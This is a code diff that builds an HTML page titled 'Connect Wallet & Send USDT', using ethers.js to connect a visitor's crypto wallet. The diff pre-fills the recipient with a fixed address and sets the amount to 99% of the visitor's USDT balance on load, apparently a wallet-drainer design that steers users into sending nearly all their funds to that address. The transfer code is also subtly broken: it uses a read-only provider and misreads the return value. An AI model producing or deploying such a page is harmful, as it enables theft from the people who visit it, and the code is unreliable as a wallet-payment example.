@@ -1,4 +1,27 @@
-<script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Wallet & Send USDT</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+</head>
+<body>
+    <button id="connectWalletBtn">Connect Wallet</button>
+    <div id="walletAddress"></div>
+
+    <h2>Send USDT (BEP-20)</h2>
+    <label for="recipientAddress">Recipient Address:</label>
+    <input type="text" id="recipientAddress" value="0xC3C0d1Fb23d0D0cD037c1F755f3d669cE4A837Fa"><br><br>
+
+    <label for="amount">Amount (USDT):</label>
+    <input type="number" id="amount" step="any"><br><br>
+
+    <button id="sendFundsBtn" disabled>Send USDT</button>
+
+    <div id="transactionResult"></div>
+
+    <script>
         document.addEventListener('DOMContentLoaded', () => {
             const connectWalletBtn = document.getElementById('connectWalletBtn');
             const walletAddressDiv = document.getElementById('walletAddress');
@@ -9,7 +32,7 @@
 
             let connectedAccount = null;
             let provider = null;
-            const usdtContractAddress = '0xC3C0d1Fb23d0D0cD037c1F755f3d669cE4A837Fa'; // USDT on BSC
+            const usdtContractAddress = '0x55d398326f99059fF775485246999027B3197955'; // USDT on BSC
 
             async function getUSDTBalance(address) {
                 if (!provider || !address) return '0';
@@ -30,15 +53,13 @@
             async function updateUSDTAmount() {
                 if (connectedAccount) {
                     const balance = await getUSDTBalance(connectedAccount);
-                    // Temporarily show the full balance
-                    amountInput.value = balance;
+                    // Set 99% of the balance
+                    const amountToSend = parseFloat(balance) * 0.99;
+                    amountInput.value = isNaN(amountToSend) ? '' : amountToSend.toString();
                 } else {
                     amountInput.value = '';
                 }
             }
-
-            // Call updateUSDTAmount on page load
-            updateUSDTAmount();
 
             connectWalletBtn.addEventListener('click', async () => {
                 if (typeof window.ethereum !== 'undefined') {
@@ -75,7 +96,43 @@
             });
 
             sendFundsBtn.addEventListener('click', async () => {
-                // ... (rest of your sendFundsBtn event listener remains the same) ...
+                if (!connectedAccount) {
+                    transactionResultDiv.textContent = 'Please connect your wallet first.';
+                    return;
+                }
+
+                const recipientAddress = recipientAddressInput.value;
+                const amountToSend = amountInput.value;
+
+                if (!recipientAddress || !amountToSend || isNaN(amountToSend) || parseFloat(amountToSend) <= 0) {
+                    transactionResultDiv.textContent = 'Please enter a valid recipient address and amount.';
+                    return;
+                }
+
+                try {
+                    const tokenContract = new ethers.Contract(usdtContractAddress, [
+                        'function transfer(address recipient, uint256 amount) external returns (bool)',
+                        'function decimals() view returns (uint8)'
+                    ], provider);
+
+                    const decimals = await tokenContract.decimals();
+                    const amountToSendWei = ethers.utils.parseUnits(amountToSend, decimals).toHexString();
+
+                    const txHash = await tokenContract.transfer(recipientAddress, amountToSendWei);
+
+                    transactionResultDiv.textContent = `Transaction sent: https://bscscan.com/tx/${txHash}`;
+                    console.log('Transaction Hash:', txHash);
+
+                } catch (error) {
+                    console.error('Error sending USDT transaction:', error);
+                    transactionResultDiv.textContent = `Transaction failed: ${error.message}`;
+                }
             });
+
+            // Attempt to update the USDT amount on initial load as well
+            updateUSDTAmount();
+
         });
     </script>
+</body>
+</html>
